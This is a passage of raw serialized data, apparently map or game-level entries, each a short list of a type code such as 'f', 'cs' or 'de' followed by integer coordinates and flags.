70, 1], [1, "f", 0, 95, 71, 1], [1, "f", 1, 95, 73, 1], [1, "f", 1, 95, 74, 1], [1, "f", 0, 95, 75, 1], [1, "f", 1, 95, 76, 1], [1, "f", 1, 95, 77, 1], [1, "f", 1, 95, 79, 1], [1, "f", 1, 95, 80, 1], [1, "f", 0, 95, 81, 1], [1, "f", 1, 95, 82, 1], [1, "f", 0, 95, 83, 1], [1, "f", 1, 95, 84, 1], [1, "f", 1, 95, 86, 1], [1, "f", 1, 95, 88, 1], [1, "f", 0, 95, 87, 1], [1, "f", 1, 95, 89, 1], [1, "f", 1, 95, 90, 1], [1, "f", 1, 95, 92, 1], [1, "f", 1, 95, 93, 1], [1, "f", 1, 95, 94, 1], [1, "f", 1, 95, 96, 1], [1, "f", 1, 95, 97, 1], [1, "f", 0, 95, 98, 1], [1, "f", 1, 95, 99, 1], [1, "f", 1, 95, 100, 1], [1, "f", 0, 95, 101, 1], [1, "f", 1, 95, 102, 1], [1, "f", 0, 95, 103, 1], [1, "f", 1, 95, 104, 1], [1, "f", 1, 95, 105, 1], [1, "f", 0, 95, 106, 1], [1, "f", 1, 95, 107, 1], [1, "f", 1, 95, 108, 1], [1, "f", 1, 95, 109, 1], [1, "f", 0, 95, 110, 1], [1, "f", 1, 95, 111, 1], [1, "f", 0, 95, 112, 1], [1, "f", 1, 95, 116, 1], [1, "f", 0, 95, 118, 1], [1, "f", 0, 95, 122, 1], [1, "f", 1, 95, 123, 1], [1, "f", 1, 95, 124, 1], [1, "f", 0, 95, 125, 1], [1, "f", 1, 95, 126, 1], [1, "f", 1, 95, 129, 1], [1, "f", 1, 95, 133, 1], [1, "f", 0, 95, 134, 1], [1, "f", 1, 95, 135, 1], [1, "f", 1, 95, 139, 1], [1, "f", 0, 95, 140, 1], [1, "f", 1, 95, 141, 1], [1, "f", 1, 95, 142, 1], [1, "f", 1, 95, 146, 1], [1, "f", 0, 95, 145, 1], [1, "f", 1, 95, 148, 1], [1, "f", 1, 95, 149, 1], [1, "f", 1, 95, 150, 1], [1, "f", 1, 95, 153, 1], [1, "cs", 0, 64, 9, 1], [1, "cs", 1, 64, 10, 1], [1, "cs", 2, 64, 16, 1], [1, "cs", 2, 64, 19, 1], [1, "cs", 0, 64, 20, 1], [1, "cs", 1, 64, 21, 1], [1, "cs", 2, 64, 22, 1], [1, "cs", 0, 64, 23, 1], [1, "cs", 2, 64, 24, 1], [1, "cs", 1, 64, 29, 1], [1, "cs", 2, 64, 30, 1], [1, "cs", 3, 64, 31, 1], [1, "cs", 0, 64, 32, 1], [1, "cs", 1, 64, 33, 1], [1, "cs", 2, 64, 34, 1], [1, "cs", 0, 64, 35, 1], [1, "cs", 2, 64, 8, 1], [1, "cs", 2, 65, 8, 1], [1, "cs", 1, 65, 9, 1], [1, "cs", 2, 65, 10, 1], [1, "cs", 3, 65, 11, 1], [1, "cs", 1, 65, 16, 1], [1, "cs", 0, 64, 17, 1], [1, "cs", 3, 65, 17, 1], [1, "cs", 2, 64, 18, 1], [1, "cs", 2, 65, 18, 1], [1, "cs", 0, 65, 19, 1], [1, "cs", 1, 65, 20, 1], [1, "cs", 3, 65, 21, 1], [1, "cs", 2, 65, 22, 1], [1, "cs", 3, 65, 23, 1], [1, "cs", 0, 65, 24, 1], [1, "cs", 2, 65, 29, 1], [1, "cs", 3, 65, 30, 1], [1, "cs", 0, 65, 31, 1], [1, "cs", 1, 65, 32, 1], [1, "cs", 2, 65, 33, 1], [1, "cs", 3, 65, 34, 1], [1, "cs", 2, 63, 9, 1], [1, "cs", 0, 62, 9, 1], [1, "cs", 2, 61, 9, 1], [1, "cs", 0, 60, 9, 1], [1, "cs", 2, 59, 9, 1], [1, "cs", 2, 58, 9, 1], [1, "cs", 0, 57, 9, 1], [1, "cs", 2, 56, 9, 1], [1, "cs", 2, 55, 9, 1], [1, "cs", 2, 54, 9, 1], [1, "cs", 0, 53, 9, 1], [1, "cs", 0, 51, 9, 1], [1, "cs", 2, 52, 9, 1], [1, "cs", 2, 50, 9, 1], [1, "cs", 2, 48, 9, 1], [1, "cs", 2, 49, 9, 1], [1, "cs", 0, 47, 9, 1], [1, "cs", 0, 45, 9, 1], [1, "cs", 0, 43, 9, 1], [1, "cs", 2, 46, 9, 1], [1, "cs", 2, 44, 9, 1], [1, "cs", 2, 42, 9, 1], [1, "cs", 2, 41, 9, 1], [1, "cs", 0, 40, 9, 1], [1, "cs", 2, 39, 9, 1], [1, "cs", 2, 38, 9, 1], [1, "cs", 0, 37, 9, 1], [1, "cs", 0, 63, 8, 1], [1, "cs", 2, 65, 7, 1], [1, "cs", 3, 64, 7, 1], [1, "cs", 2, 62, 8, 1], [1, "cs", 3, 61, 8, 1], [1, "cs", 1, 62, 7, 1], [1, "cs", 2, 63, 7, 1], [1, "cs", 0, 64, 6, 1], [1, "cs", 3, 65, 6, 1], [1, "cs", 2, 63, 6, 1], [1, "cs", 2, 62, 6, 1], [1, "cs", 2, 61, 6, 1], [1, "cs", 2, 60, 6, 1], [1, "cs", 2, 59, 6, 1], [1, "cs", 2, 61, 7, 1], [1, "cs", 0, 60, 7, 1], [1, "cs", 2, 60, 8, 1], [1, "cs", 2, 59, 7, 1], [1, "cs", 2, 59, 8, 1], [1, "cs", 1, 58, 8, 1], [1, "cs", 1, 57, 6, 1], [1, "cs", 1, 55, 7, 1], [1, "cs", 0, 56, 6, 1], [1, "cs", 2, 58, 6, 1], [1, "cs", 2, 58, 7, 1], [1, "cs", 2, 57, 7, 1], [1, "cs", 2, 56, 7, 1], [1, "cs", 2, 55, 6, 1], [1, "cs", 2, 57, 8, 1], [1, "cs", 2, 56, 8, 1], [1, "cs", 2, 55, 8, 1], [1, "cs", 0, 54, 8, 1], [1, "cs", 0, 50, 7, 1], [1, "cs", 0, 53, 6, 1], [1, "cs", 2, 54, 6, 1], [1, "cs", 2, 54, 7, 1], [1, "cs", 2, 53, 7, 1], [1, "cs", 2, 52, 7, 1], [1, "cs", 2, 52, 6, 1], [1, "cs", 1, 52, 8, 1], [1, "cs", 2, 53, 8, 1], [1, "cs", 2, 51, 8, 1], [1, "cs", 2, 51, 7, 1], [1, "cs", 2, 51, 6, 1], [1, "cs", 2, 50, 6, 1], [1, "cs", 2, 50, 8, 1], [1, "cs", 2, 49, 8, 1], [1, "cs", 2, 49, 7, 1], [1, "cs", 2, 49, 6, 1], [1, "cs", 0, 46, 7, 1], [1, "cs", 1, 48, 8, 1], [1, "cs", 1, 44, 7, 1], [1, "cs", 1, 41, 8, 1], [1, "cs", 2, 48, 7, 1], [1, "cs", 2, 48, 6, 1], [1, "cs", 2, 47, 6, 1], [1, "cs", 2, 47, 7, 1], [1, "cs", 2, 47, 8, 1], [1, "cs", 2, 46, 8, 1], [1, "cs", 2, 45, 8, 1], [1, "cs", 2, 45, 7, 1], [1, "cs", 2, 45, 6, 1], [1, "cs", 2, 46, 6, 1], [1, "cs", 2, 44, 6, 1], [1, "cs", 2, 44, 8, 1], [1, "cs", 2, 43, 8, 1], [1, "cs", 2, 43, 7, 1], [1, "cs", 2, 43, 6, 1], [1, "cs", 2, 42, 6, 1], [1, "cs", 2, 42, 7, 1], [1, "cs", 2, 42, 8, 1], [1, "cs", 2, 41, 7, 1], [1, "cs", 2, 41, 6, 1], [1, "cs", 2, 40, 6, 1], [1, "cs", 2, 40, 7, 1], [1, "cs", 2, 40, 8, 1], [1, "cs", 2, 39, 8, 1], [1, "cs", 0, 39, 7, 1], [1, "cs", 1, 38, 8, 1], [1, "cs", 2, 39, 6, 1], [1, "cs", 2, 38, 6, 1], [1, "cs", 2, 37, 6, 1], [1, "cs", 2, 38, 7, 1], [1, "cs", 2, 37, 7, 1], [1, "cs", 2, 37, 8, 1], [1, "cs", 2, 37, 10, 1], [1, "cs", 2, 38, 10, 1], [1, "cs", 0, 38, 11, 1], [1, "cs", 0, 38, 17, 1], [1, "cs", 1, 37, 18, 1], [1, "cs", 0, 38, 19, 1], [1, "cs", 2, 37, 11, 1], [1, "cs", 2, 37, 16, 1], [1, "cs", 2, 37, 17, 1], [1, "cs", 2, 38, 18, 1], [1, "cs", 2, 37, 19, 1], [1, "cs", 3, 38, 16, 1], [1, "cs", 0, 37, 21, 1], [1, "cs", 0, 38, 22, 1], [1, "cs", 0, 38, 24, 1], [1, "cs", 2, 37, 20, 1], [1, "cs", 2, 38, 20, 1], [1, "cs", 2, 38, 21, 1], [1, "cs", 1, 37, 23, 1], [1, "cs", 3, 37, 22, 1], [1, "cs", 3, 38, 23, 1], [1, "cs", 2, 37, 24, 1], [1, "cs", 0, 38, 30, 1], [1, "cs", 0, 38, 32, 1], [1, "cs", 0, 37, 31, 1], [1, "cs", 1, 38, 34, 1], [1, "cs", 1, 37, 29, 1], [1, "cs", 2, 38, 29, 1], [1, "cs", 2, 37, 30, 1], [1, "cs", 2, 38, 31, 1], [1, "cs", 2, 37, 32, 1], [1, "cs", 3, 38, 33, 1], [1, "cs", 3, 38, 35, 1], [1, "cs", 2, 37, 33, 1], [1, "cs", 2, 36, 8, 1], [1, "cs", 0, 36, 11, 1], [1, "cs", 0, 35, 9, 1], [1, "cs", 2, 36, 9, 1], [1, "cs", 2, 36, 10, 1], [1, "cs", 2, 35, 10, 1], [1, "cs", 1, 33, 8, 1], [1, "cs", 3, 34, 9, 1], [1, "cs", 3, 35, 8, 1], [1, "cs", 2, 34, 8, 1], [1, "cs", 0, 36, 7, 1], [1, "cs", 1, 34, 7, 1], [1, "cs", 2, 35, 7, 1], [1, "cs", 2, 35, 6, 1], [1, "cs", 2, 36, 6, 1], [1, "cs", 2, 68, 9, 1], [1, "cs", 2, 66, 10, 1], [1, "cs", 3, 66, 9, 1], [1, "cs", 0, 67, 9, 1], [1, "cs", 0, 66, 8, 1], [1, "cs", 2, 67, 8, 1], [1, "cs", 1, 68, 8, 1], [1, "cs", 1, 66, 11, 1], [1, "cs", 2, 67, 10, 1], [1, "cs", 0, 66, 6, 1], [1, "cs", 2, 66, 7, 1], [1, "cs", 2, 67, 7, 1], [1, "cs", 2, 69, 8, 1], [1, "cs", 2, 63, 32, 1], [1, "cs", 2, 62, 34, 1], [1, "cs", 2, 60, 35, 1], [1, "cs", 3, 59, 35, 1], [1, "cs", 0, 61, 35, 1], [1, "cs", 0, 63, 34, 1], [1, "cs", 2, 63, 33, 1], [1, "cs", 2, 63, 35, 1], [1, "cs", 2, 62, 35, 1], [1, "cs", 2, 58, 36, 1], [1, "cs", 1, 59, 36, 1], [1, "cs", 1, 62, 36, 1], [1, "cs", 2, 60, 36, 1], [1, "cs", 2, 61, 34, 1], [1, "cs", 3, 62, 33, 1], [1, "cs", 3, 63, 36, 1], [1, "cs", 3, 61, 36, 1], [1, "cs", 0, 42, 36, 1], [1, "cs", 1, 39, 36, 1], [1, "cs", 2, 41, 36, 1], [1, "cs", 3, 39, 35, 1], [1, "cs", 3, 40, 36, 1], [1, "cs", 3, 43, 36, 1], [1, "cs", 1, 40, 35, 1], [1, "cs", 2, 41, 35, 1], [1, "cs", 2, 40, 34, 1], [1, "cs", 2, 39, 34, 1], [1, "cs", 2, 39, 33, 1], [1, "cs", 2, 39, 32, 1], [1, "cs", 0, 40, 33, 1], [1, "cs", 2, 41, 34, 1], [1, "cs", 1, 44, 36, 1], [1, "cs", 3, 43, 35, 1], [1, "cs", 2, 42, 35, 1], [1, "cs", 0, 37, 34, 1], [1, "cs", 3, 59, 30, 1], [1, "cs", 0, 60, 29, 1], [1, "cs", 2, 60, 28, 1], [1, "cs", 3, 60, 27, 1], [1, "cs", 0, 60, 26, 1], [1, "cs", 2, 54, 25, 1], [1, "cs", 2, 48, 25, 1], [1, "cs", 2, 42, 26, 1], [1, "cs", 0, 55, 25, 1], [1, "cs", 2, 59, 26, 1], [1, "cs", 0, 43, 26, 1], [1, "cs", 1, 42, 27, 1], [1, "cs", 2, 42, 28, 1], [1, "cs", 2, 43, 30, 1], [1, "cs", 0, 42, 29, 1], [1, "cs", 0, 54, 24, 1], [1, "cs", 0, 48, 24, 1], [1, "cs", 2, 54, 23, 1], [1, "cs", 2, 48, 23, 1], [1, "cs", 2, 63, 22, 1], [1, "cs", 2, 63, 21, 1], [1, "cs", 2, 39, 21, 1], [1, "cs", 3, 57, 18, 1], [1, "cs", 2, 56, 18, 1], [1, "cs", 3, 51, 21, 1], [1, "cs", 0, 51, 20, 1], [1, "cs", 2, 51, 19, 1], [1, "cs", 3, 51, 18, 1], [1, "cs", 2, 63, 16, 1], [1, "cs", 2, 63, 10, 1], [1, "cs", 2, 56, 13, 1], [1, "cs", 3, 57, 13, 1], [1, "cs", 1, 45, 18, 1], [1, "cs", 2, 47, 18, 1], [1, "cs", 2, 46, 18, 1], [1, "cs", 0, 46, 13, 1], [1, "cs", 2, 45, 13, 1], [1, "cs", 2, 39, 10, 1], [1, "cs", 2, 39, 16, 1], [1, "cs", 2, 47, 17, 1], [1, "a", 0, 51, 15, 1], [1, "a", 1, 53, 14, 1], [1, "a", 1, 49, 14, 1], [1, "de", 8, 55, 15, 0], [1, "de", 9, 48, 28, 0], [1, "de", 10, 58, 26, 0], [1, "de", 11, 59, 29, 0], [1, "de", 11, 55, 34, 0], [1, "de", 10, 48, 33, 0], [1, "de", 9, 41, 32, 0], [1, "de", 9, 56, 24, 0], [1, "de", 9, 62, 16, 0], [1, "de", 9, 45, 11, 0], [1, "de", 9, 44, 17, 0], [1, "de", 10, 44, 13, 0], [1, "de", 10, 58, 13, 0], [1, "de", 10, 63, 31, 0], [1, "de", 8, 60, 30, 0], [1, "de", 8, 43, 26, 0], [1, "de", 10, 43, 29, 0], [1, "de", 10, 53, 29, 0], [1, "de", 10, 53, 24, 0], [1, "de", 9, 53, 19, 0], [1, "de", 11, 49, 19, 0], [1, "de", 10, 39, 26, 0], [1, "de", 9, 46, 24, 0], [1, "de", 9, 62, 10, 0], [1, "de", 8, 40, 14, 0], [1, "de", 32, 55, 35, 0], [1, "de", 32, 60, 33, 0], [1, "de", 32, 63, 28, 0], [1, "de", 32, 63, 24, 0], [1, "de", 32, 58, 22, 0], [1, "de", 32, 59, 17, 0], [1, "de", 32, 63, 13, 0], [1, "de", 32, 59, 10, 0], [1, "de", 32, 56, 12, 0], [1, "de", 32, 52, 17, 0], [1, "de", 32, 51, 14, 0], [1, "de", 32, 39, 12, 0], [1, "de", 32, 39, 18, 0], [1, "de", 32, 41, 25, 0], [1, "de", 32, 39, 30, 0], [1, "de", 32, 50, 29, 0], [1, "de", 32, 43, 34, 0], [1, "de", 32, 47, 34, 0], [1, "de", 31, 54, 33, 0], [1, "de", 31, 59, 24, 0], [1, "de", 31, 63, 19, 0], [1, "de", 31, 47, 15, 0], [1, "de", 31, 43, 17, 0], [1, "de", 31, 39, 27, 0], [1, "de", 31, 48, 27, 0], [1, "de", 31, 57, 27, 0], [1, "de", 32, 44, 27, 0], [1, "d", 0, 12, 13, 1], [1, "d", 0, 89, 13, 1], [1, "d", 1, 91, 21, 1], [1, "d", 1, 10, 22, 1], [1, "f", 2, 89, 18, 1], [1, "f", 0, 88, 19, 1], [1, "g", 1, 85, 22, 1], [1, "s", 1, 90, 29, 1], [1, "s", 1, 92, 15, 1], [1, "s", 0, 91, 31, 1], [1, "s", 2, 90, 38, 1], [1, "s", 0, 91, 42, 1], [1, "s", 0, 90, 49, 1], [1, "f", 1, 86, 43, 1], [1, "f", 0, 81, 45, 1], [1, "f", 2, 66, 44, 1], [1, "f", 2, 55, 49, 1], [1, "f", 1, 54, 50, 1], [1, "f", 2, 43, 45, 1], [1, "f", 2, 31, 48, 1], [1, "f", 1, 27, 39, 1], [1, "f", 1, 80, 46, 1], [1, "f", 1, 69, 48, 1], [1, "g", 0, 80, 40, 1], [1, "g", 2, 81, 40, 1], [1, "s", 2, 77, 39, 1], [1, "s", 0, 68, 43, 1], [1, "s", 2, 57, 41, 1], [1, "s", 1, 56, 42, 1], [1, "s", 1, 40, 41, 1], [1, "s", 2, 48, 48, 1], [1, "f", 2, 17, 12, 1], [1, "f", 0, 13, 31, 1], [1, "f", 1, 14, 32, 1], [1, "s", 0, 15, 27, 1], [1, "s", 0, 13, 39, 1], [1, "f", 2, 11, 17, 1], [1, "f", 1, 12, 18, 1], [1, "g", 2, 12, 25, 1], [1, "f", 0, 16, 45, 1], [1, "f", 1, 17, 46, 1], [1, "s", 1, 74, 48, 1], [1, "s", 1, 20, 47, 1], [1, "g", 0, 58, 59, 1], [1, "g", 0, 46, 72, 1], [1, "g", 0, 69, 79, 1], [1, "g", 0, 72, 74, 1], [1, "g", 0, 26, 88, 1], [1, "g", 0, 20, 74, 1], [1, "g", 0, 28, 67, 1], [1, "g", 0, 49, 86, 1], [1, "g", 0, 77, 90, 1], [1, "g", 0, 87, 72, 1], [1, "g", 0, 14, 85, 1], [1, "g", 1, 85, 97, 1], [1, "g", 1, 68, 104, 1], [1, "g", 1, 63, 91, 1], [1, "g", 1, 39, 90, 1], [1, "g", 1, 34, 99, 1], [1, "g", 1, 17, 103, 1], [1, "g", 2, 77, 60, 1], [1, "g", 2, 19, 56, 1], [1, "g", 2, 39, 60, 1], [1, "g", 2, 87, 57, 1], [1, "f", 0, 9, 62, 1], [1, "f", 0, 12, 81, 1], [1, "f", 0, 26, 59, 1], [1, "f", 0, 35, 53, 1], [1, "f", 0, 44, 58, 1], [1, "f", 0, 88, 62, 1], [1, "f", 0, 91, 82, 1], [1, "f", 0, 84, 85, 1], [1, "f", 0, 79, 69, 1], [1, "f", 0, 64, 71, 1], [1, "f", 0, 62, 83, 1], [1, "f", 0, 34, 81, 1], [1, "f", 0, 39, 71, 1], [1, "f", 0, 54, 94, 1], [1, "f", 1, 81, 70, 1], [1, "f", 1, 91, 72, 1], [1, "f", 1, 8, 91, 1], [1, "f", 1, 14, 81, 1], [1, "f", 1, 29, 79, 1], [1, "f", 1, 13, 65, 1], [1, "f", 1, 46, 97, 1], [1, "f", 1, 43, 73, 1], [1, "f", 1, 60, 69, 1], [1, "f", 1, 70, 96, 1], [1, "f", 1, 58, 84, 1], [1, "s", 1, 56, 76, 1], [1, "s", 1, 85, 74, 1], [1, "s", 0, 72, 71, 1], [1, "s", 0, 41, 62, 1], [1, "s", 0, 60, 61, 1], [1, "s", 0, 20, 66, 1], [1, "s", 0, 47, 83, 1], [1, "s", 0, 29, 86, 1], [1, "s", 0, 78, 92, 1], [1, "s", 0, 62, 102, 1], [1, "s", 0, 18, 95, 1], [1, "s", 2, 64, 101, 1], [1, "s", 2, 78, 84, 1], [1, "s", 2, 49, 83, 1], [1, "s", 2, 15, 76, 1], [1, "s", 2, 21, 84, 1], [1, "f", 1, 26, 94, 1], [1, "f", 2, 23, 96, 1], [1, "f", 2, 25, 72, 1], [1, "f", 2, 85, 77, 1], [1, "f", 2, 79, 95, 1], [1, "f", 2, 51, 65, 1], [1, "f", 2, 69, 60, 1], [1, "f", 1, 25, 105, 1], [1, "s", 1, 18, 68, 1], [1, "s", 0, 55, 76, 1], [1, "s", 0, 74, 59, 1], [1, "f", 1, 46, 142, 1], [1, "f", 1, 19, 140, 1], [1, "f", 1, 77, 137, 1], [1, "f", 0, 75, 137, 1], [1, "f", 0, 55, 138, 1], [1, "f", 0, 33, 127, 1], [1, "f", 0, 76, 121, 1], [1, "f", 0, 55, 121, 1], [1, "f", 0, 13, 123, 1], [1, "f", 0, 18, 141, 1], [1, "f", 0, 40, 137, 1], [1, "f", 2, 76, 142, 1], [1, "f", 2, 57, 140, 1], [1, "f", 2, 39, 138, 1], [1, "f", 2, 16, 143, 1], [1, "f", 2, 29, 131, 1], [1, "f", 0, 70, 150, 1], [1, "f", 0, 28, 146, 1], [1, "f", 0, 12, 132, 1], [1, "f", 0, 90, 129, 1], [1, "f", 1, 87, 131, 1], [1, "f", 0, 91, 143, 1], [1, "f", 2, 87, 145, 1], [1, "f", 1, 89, 141, 1], [1, "f", 1, 63, 130, 1], [1, "f", 1, 75, 122, 1], [1, "f", 1, 52, 124, 1], [1, "f", 1, 34, 127, 1], [1, "f", 1, 14, 123, 1], [1, "f", 1, 24, 122, 1], [1, "f", 0, 83, 108, 1], [1, "f", 0, 89, 118, 1], [1, "f", 0, 56, 107, 1], [1, "f", 0, 38, 113, 1], [1, "f", 0, 16, 110, 1], [1, "f", 1, 80, 105, 1], [1, "f", 1, 82, 109, 1], [1, "f", 1, 87, 118, 1], [1, "f", 1, 59, 110, 1], [1, "f", 1, 29, 111, 1], [1, "f", 2, 28, 112, 1], [1, "f", 2, 70, 112, 1], [1, "f", 2, 42, 111, 1], [1, "s", 0, 68, 157, 1], [1, "s", 0, 81, 158, 1], [1, "s", 0, 25, 172, 1], [1, "s", 0, 22, 161, 1], [1, "s", 0, 35, 152, 1], [1, "s", 0, 66, 144, 1], [1, "s", 0, 87, 145, 1], [1, "s", 0, 86, 145, 1], [1, "s", 0, 84, 135, 1], [1, "s", 0, 69, 133, 1], [1, "s", 0, 84, 122, 1], [1, "s", 0, 68, 121, 1], [1, "s", 0, 48, 124, 1], [1, "s", 0, 26, 129, 1], [1, "s", 0, 9, 127, 1], [1, "s", 0, 11, 144, 1], [1, "s", 0, 9, 109, 1], [1, "s", 0, 35, 101, 1], [1, "s", 0, 47, 109, 1], [1, "s", 0, 58, 111, 1], [1, "s", 0, 84, 110, 1], [1, "s", 0, 28, 114, 1], [1, "s", 1, 30, 116, 1], [1, "s", 1, 46, 112, 1], [1, "s", 1, 81, 111, 1], [1, "s", 1, 70, 123, 1], [1, "s", 1, 49, 127, 1], [1, "s", 1, 66, 134, 1], [1, "s", 1, 67, 144, 1], [1, "s", 1, 38, 152, 1], [1, "s", 1, 21, 164, 1], [1, "s", 1, 12, 147, 1], [1, "s", 1, 24, 130, 1], [1, "s", 1, 12, 125, 1], [1, "s", 1, 65, 158, 1], [1, "s", 1, 83, 167, 1], [1, "s", 1, 65, 167, 1], [1, "s", 1, 47, 164, 1], [1, "s", 1, 56, 168, 1], [1, "s", 2, 54, 169, 1], [1, "s", 2, 88, 170, 1], [1, "s", 2, 91, 162, 1], [1, "s", 2, 79, 149, 1], [1, "s", 2, 75, 144, 1], [1, "s", 2, 57, 150, 1], [1, "s", 2, 47, 143, 1], [1, "s", 2, 31, 145, 1], [1, "s", 2, 36, 138, 1], [1, "s", 2, 10, 163, 1], [1, "s", 2, 22, 142, 1], [1, "g", 2, 78, 132, 1], [1, "g", 1, 48, 135, 1], [1, "g", 2, 16, 136, 1], [1, "g", 0, 62, 92, 1], [1, "g", 2, 70, 80, 1], [1, "g", 2, 15, 86, 1], [1, "g", 2, 47, 75, 1], [1, "g", 2, 36, 89, 1], [1, "g", 2, 80, 90, 1], [1, "f", 1, 39, 118, 1], [1, "d", 2, 84, 54, 1], [1, "d", 2, 16, 54, 1], [1, "de", 7, 13, 13, 0], [1, "de", 5, 16, 28, 0], [1, "de", 5, 9, 25, 0], [1, "de", 5, 34, 41, 0], [1, "de", 4, 28, 40, 0], [1, "de", 6, 31, 47, 0], [1, "de", 6, 12, 39, 0], [1, "de", 4, 16, 47, 0], [1, "de", 4, 7, 46, 0], [1, "de", 6, 7, 33, 0], [1, "de", 6, 40, 42, 0], [1, "de", 7, 20, 48, 0], [1, "de", 7, 29, 59, 0], [1, "de", 6, 27, 58, 0], [1, "de", 6, 15, 54, 0], [1, "de", 5, 12, 66, 0], [1, "de", 5, 37, 53, 0], [1, "de", 4, 10, 63, 0], [1, "de", 7, 49, 48, 0], [1, "de", 7, 37, 63, 0], [1, "de", 6, 33, 68, 0], [1, "de", 6, 56, 52, 0], [1, "de", 5, 59, 58, 0], [1, "de", 6, 48, 58, 0], [1, "de", 4, 53, 63, 0], [1, "de", 4, 67, 44, 0], [1, "de", 5, 70, 49, 0], [1, "de", 5, 82, 55, 0], [1, "de", 5, 79, 41, 0], [1, "de", 5, 91, 29, 0], [1, "de", 7, 91, 43, 0], [1, "de", 6, 85, 44, 0], [1, "de", 6, 74, 60, 0], [1, "de", 6, 90, 8, 0], [1, "de", 5, 91, 15, 0], [1, "de", 4, 87, 20, 0], [1, "de", 7, 93, 11, 0], [1, "de", 6, 91, 21, 0], [1, "de", 6, 85, 35, 0], [1, "de", 5, 93, 58, 0], [1, "de", 5, 87, 63, 0], [1, "de", 7, 77, 62, 0], [1, "de", 6, 68, 61, 0], [1, "de", 5, 90, 73, 0], [1, "de", 4, 87, 71, 0], [1, "de", 7, 80, 71, 0], [1, "de", 7, 83, 77, 0], [1, "de", 7, 89, 83, 0], [1, "de", 4, 71, 80, 0], [1, "de", 4, 71, 70, 0], [1, "de", 5, 63, 72, 0], [1, "de", 4, 54, 75, 0], [1, "de", 5, 44, 83, 0], [1, "de", 5, 42, 74, 0], [1, "de", 5, 15, 81, 0], [1, "de", 4, 29, 80, 0], [1, "de", 4, 37, 90, 0], [1, "de", 4, 7, 75, 0], [1, "de", 6, 22, 74, 0], [1, "de", 6, 43, 95, 0], [1, "de", 6, 57, 85, 0], [1, "de", 6, 19, 94, 0], [1, "de", 6, 9, 92, 0], [1, "de", 5, 26, 89, 0], [1, "de", 5, 31, 112, 0], [1, "de", 5, 54, 108, 0], [1, "de", 5, 55, 95, 0], [1, "de", 5, 35, 104, 0], [1, "de", 5, 13, 110, 0], [1, "de", 7, 27, 107, 0], [1, "de", 7, 47, 99, 0], [1, "de", 7, 11, 104, 0], [1, "de", 7, 9, 111, 0], [1, "de", 7, 40, 114, 0], [1, "de", 7, 28, 117, 0], [1, "de", 7, 47, 113, 0], [1, "de", 7, 63, 104, 0], [1, "de", 4, 64, 92, 0], [1, "de", 6, 86, 97, 0], [1, "de", 5, 76, 91, 0], [1, "de", 5, 85, 86, 0], [1, "de", 6, 78, 83, 0], [1, "de", 6, 71, 97, 0], [1, "de", 4, 69, 105, 0], [1, "de", 4, 79, 104, 0], [1, "de", 4, 86, 109, 0], [1, "de", 4, 86, 118, 0], [1, "de", 5, 70, 113, 0], [1, "de", 6, 69, 121, 0], [1, "de", 6, 76, 122, 0], [1, "de", 7, 87, 130, 0], [1, "de", 4, 84, 123, 0], [1, "de", 4, 57, 121, 0], [1, "de", 5, 53, 125, 0], [1, "de", 5, 62, 131, 0], [1, "de", 6, 67, 143, 0], [1, "de", 5, 77, 143, 0], [1, "de", 5, 85, 136, 0], [1, "de", 6, 87, 147, 0], [1, "de", 6, 92, 140, 0], [1, "de", 4, 93, 127, 0], [1, "de", 5, 93, 106, 0], [1, "de", 5, 45, 144, 0], [1, "de", 4, 41, 139, 0], [1, "de", 4, 54, 138, 0], [1, "de", 6, 29, 145, 0], [1, "de", 6, 29, 132, 0], [1, "de", 6, 35, 127, 0], [1, "de", 6, 64, 142, 0], [1, "de", 5, 23, 131, 0], [1, "de", 5, 9, 134, 0], [1, "de", 6, 11, 121, 0], [1, "de", 4, 26, 121, 0], [1, "de", 35, 58, 150, 0], [1, "de", 33, 48, 156, 0], [1, "de", 33, 25, 158, 0], [1, "de", 33, 36, 154, 0], [1, "de", 34, 9, 154, 0], [1, "de", 34, 13, 148, 0], [1, "de", 34, 21, 142, 0], [1, "de", 34, 38, 139, 0], [1, "de", 34, 47, 144, 0], [1, "de", 34, 68, 142, 0], [1, "de", 36, 70, 135, 0], [1, "de", 36, 64, 132, 0], [1, "de", 36, 86, 134, 0], [1, "de", 36, 90, 141, 0], [1, "de", 36, 93, 131, 0], [1, "de", 36, 91, 125, 0], [1, "de", 36, 76, 123, 0], [1, "de", 33, 82, 122, 0], [1, "de", 35, 56, 122, 0], [1, "de", 35, 40, 119, 0], [1, "de", 35, 17, 112, 0], [1, "de", 35, 37, 102, 0], [1, "de", 33, 18, 97, 0], [1, "de", 34, 10, 83, 0], [1, "de", 33, 19, 73, 0], [1, "de", 33, 10, 60, 0], [1, "de", 35, 24, 60, 0], [1, "de", 36, 14, 45, 0], [1, "de", 36, 21, 42, 0], [1, "de", 35, 8, 32, 0], [1, "de", 33, 9, 24, 0], [1, "de", 35, 35, 27, 0], [1, "de", 33, 56, 35, 0], [1, "de", 36, 53, 36, 0], [1, "de", 33, 45, 35, 0], [1, "de", 35, 53, 39, 0], [1, "de", 36, 57, 30, 0], [1, "de", 33, 86, 108, 0], [1, "de", 33, 68, 112, 0], [1, "de", 33, 49, 109, 0], [1, "de", 33, 46, 95, 0], [1, "de", 33, 90, 76, 0], [1, "de", 36, 76, 83, 0], [1, "de", 36, 70, 72, 0], [1, "de", 36, 78, 63, 0], [1, "de", 36, 90, 64, 0], [1, "de", 36, 60, 70, 0], [1, "de", 35, 75, 90, 0], [1, "de", 35, 81, 58, 0], [1, "de", 35, 91, 51, 0], [1, "de", 35, 93, 56, 0], [1, "de", 35, 61, 60, 0], [1, "de", 35, 66, 46, 0], [1, "de", 33, 90, 19, 0], [1, "de", 34, 92, 9, 0], [1, "de", 35, 75, 39, 0], [1, "de", 35, 67, 42, 0], [1, "de", 35, 93, 37, 0], [1, "de", 36, 89, 28, 0], [1, "de", 36, 42, 61, 0], [1, "de", 33, 49, 50, 0], [1, "de", 33, 44, 75, 0], [1, "de", 33, 46, 85, 0], [1, "de", 33, 64, 84, 0], [1, "de", 33, 56, 94, 0], [1, "de", 33, 25, 90, 0], [1, "de", 33, 31, 69, 0], [1, "de", 35, 34, 54, 0], [1, "de", 35, 29, 47, 0], [1, "de", 36, 42, 41, 0], [1, "de", 36, 29, 34, 0], [1, "de", 35, 20, 55, 0], [1, "de", 35, 14, 52, 0], [1, "s", 2, 12, 171, 1], [1, "r", 20, 188, 0], [1, "r", 21, 188, 0], [1, "r", 22, 188, 0], [1, "r", 23, 188, 0], [1, "r", 24, 188, 0], [1, "r", 25, 189, 0], [1, "r", 24, 189, 0], [1, "r", 23, 189, 0], [1, "r", 22, 189, 0], [1, "r", 21, 189, 0], [1, "r", 20, 189, 